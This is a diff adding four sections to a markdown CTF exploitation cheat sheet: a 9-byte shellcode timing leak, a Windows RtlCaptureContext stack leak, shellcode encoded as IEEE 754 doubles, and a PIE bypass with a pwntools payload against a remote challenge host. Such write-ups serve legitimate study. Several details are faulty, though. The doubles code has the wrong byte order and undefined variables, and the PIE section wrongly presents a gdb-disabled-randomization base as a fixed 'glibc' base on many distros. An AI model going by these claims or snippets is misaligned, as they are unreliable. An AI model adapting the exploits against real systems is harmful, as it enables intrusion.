@@ -14,6 +14,10 @@
 - [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
 - [ret2dlresolve](#ret2dlresolve)
 - [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)
+- [9-Byte test+je Timing Leak (hxp 2018)](#9-byte-testje-timing-leak-hxp-2018)
+- [RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)](#rtlcapturecontext-deterministic-windows-stack-leak-insomnihack-2017)
+- [IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)](#ieee-754-double-as-shellcode-via-exponent-fixing-kaspersky-2018)
+- [PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)](#pie-bypass-via-consistent-glibc-load-base-0x56555000-tamuctf-2019)
 
 **See also:** [heap-techniques.md](heap-techniques.md) — House of Apple 2, House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocator exploitation (nginx, talloc), classic unlink, musl libc heap, tcache stashing unlink
 
@@ -236,3 +240,87 @@ For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Qu
 - Check kernel config for disabled protections:
   - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
   - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations
+
+---
+
+## 9-Byte test+je Timing Leak (hxp 2018)
+
+**Pattern:** The shellcode slot is only 9 bytes — too small for a full read/write. Write a 7-byte `test BYTE PTR [rip+0x2], imm8` followed by a 2-byte `je 0` (infinite loop on zero flag). Read the flag one bit at a time by flipping the immediate, then close the socket and measure round-trip time: `<2 s` = crashed (bit differs from imm), `>2 s` = hung (bit matches, loop fired).
+
+```asm
+f6 05 02 00 00 00 X    test BYTE PTR [rip+0x2], X
+74 fe                  je   0
+```
+
+**Key insight:** Tiny shellcode budgets can still leak a full flag if you turn the loop / crash distinction into a 1-bit channel. Any operation that hangs on one branch and crashes on the other works — `hlt`, page faults, or explicit infinite loops.
+
+**References:** hxp CTF 2018 — yunospace, writeup 12570
+
+---
+
+## RtlCaptureContext Deterministic Windows Stack Leak (Insomnihack 2017)
+
+**Pattern:** Need a stack leak on Windows with ASLR but no format string. `ntdll!RtlCaptureContext(&ctx)` writes the current register set (including `Rsp`) into a user-supplied `CONTEXT` struct. Call it once from attacker-chosen code, then read `ctx.Rsp` from the same buffer.
+
+```c
+CONTEXT ctx;
+RtlCaptureContext(&ctx);
+printf("rsp = %p\n", (void*)ctx.Rsp);
+```
+
+**Key insight:** Windows NT API has several "dump register state" helpers intended for unwinding and exception handling. They behave as deterministic info-leak primitives for exploitation because they copy `RSP` verbatim into user memory with no randomisation.
+
+**References:** Insomnihack 2017 — winworld, writeup 12876
+
+---
+
+## IEEE 754 Double-as-Shellcode via Exponent Fixing (Kaspersky 2018)
+
+**Pattern:** Challenge writes exactly six 8-byte IEEE 754 doubles into a buffer and then computes `(d1 + d2 + d3 + d4 + d5 + d6) / 6` — the result is executed. Force every summand to have exponent bits `0x4330` (`1075 = 1023 + 52`), which gives an exactly-representable 52-bit integer, so double addition behaves like integer addition with no rounding. Encode the target shellcode as an integer, pick `d6` so the sum hits it exactly.
+
+```python
+def shellcode_to_double(bytes_):
+    # Pin exponent so the payload bits are preserved
+    return struct.unpack('d', b'\x30\x43' + bytes_[:6])[0]
+
+d1 = shellcode_to_double(sc[ 0: 6])
+d2 = shellcode_to_double(sc[ 6:12])
+d3 = shellcode_to_double(sc[12:18])
+d4 = shellcode_to_double(sc[18:24])
+d5 = shellcode_to_double(sc[24:30])
+# d6 chosen so 6*target == d1+d2+d3+d4+d5+d6
+target_int = int_from_shellcode(sc_full)
+d6 = 6*target_int - (d1_int + d2_int + d3_int + d4_int + d5_int)
+```
+
+**Key insight:** IEEE 754 doubles are lossless integer containers whenever the exponent field is fixed at `bias + 52`. Any "you can only write N doubles" primitive is equivalent to "you can write N×6 bytes of raw data", as long as you control the exponent bits. Works identically for 32-bit floats (`bias + 23`) and long doubles.
+
+**References:** Kaspersky Industrial CTF 2018 — doubles, writeups 12324, 12326
+
+---
+
+## PIE Bypass via Consistent glibc Load Base 0x56555000 (TAMUctf 2019)
+
+**Pattern (pwn2):** PIE-enabled 32-bit ELF with no leak primitive. A function pointer on the stack is called after `strcpy`ing user input into a 30-byte buffer; overwriting the pointer lets us pick any code target — but the randomised base normally blocks picking `print_flag`. Observation: on the challenge runtime (and many default glibc configurations for i386 PIE binaries), the loader places the executable at the fixed base `0x56555000` across runs. That makes PIE effectively a known-offset: `print_flag = 0x56555000 + 0x6dc`, reachable without any leak.
+
+```python
+# `gdb -q ./pwn2` -> `info proc mappings`
+# 0x56555000 0x56556000 0x1000    0x0 ./pwn2
+# 0x56556000 0x56557000 0x1000    0x0 ./pwn2
+# print_flag symbol offset: 0x6dc
+
+from pwn import *
+
+PIE_BASE = 0x56555000
+print_flag = PIE_BASE + 0x6dc
+
+payload  = cyclic(30)           # buffer(30) -> reaches the fn pointer slot
+payload += p32(print_flag)      # overwrite var_C called after strcmp
+io = remote('pwn.tamuctf.com', 4322)
+io.sendline(payload)
+io.interactive()
+```
+
+**Key insight:** 32-bit PIE on many distros emits `ET_DYN` with a stock `mmap_base` of `0x56555000` because `brk_randomization` and ASLR entropy are minimal. If `info proc mappings` shows the same base across multiple runs (in the challenge container or in gdb with `set disable-randomization on`), treat the "random" base as a constant. Always enumerate map bases before assuming a leak is required — the same trick applies to stacks started under `ulimit -s unlimited` (base becomes `0x7fff_f000` deterministically).
+
+**References:** TAMUctf 2019 — pwn2, writeup 13423
